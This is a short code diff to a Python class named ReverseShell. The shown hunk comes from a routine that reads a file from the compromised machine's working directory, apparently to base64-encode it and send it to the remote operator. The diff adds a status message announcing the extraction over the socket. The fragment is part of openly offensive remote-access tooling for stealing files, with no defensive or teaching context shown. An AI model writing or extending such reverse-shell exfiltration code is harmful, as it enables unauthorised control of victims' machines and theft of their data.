@@ -84,6 +84,7 @@ class ReverseShell:
                         try:
                             file_path = os.path.join(os.getcwd(), filename)
                             if os.path.exists(file_path):
+                                self.sock.send(f"[SYSTEM] Extracting: {filename}...\n".encode("utf-8"))
                                 import base64
                                 with open(file_path, "rb") as f:
                                     content = f.read()
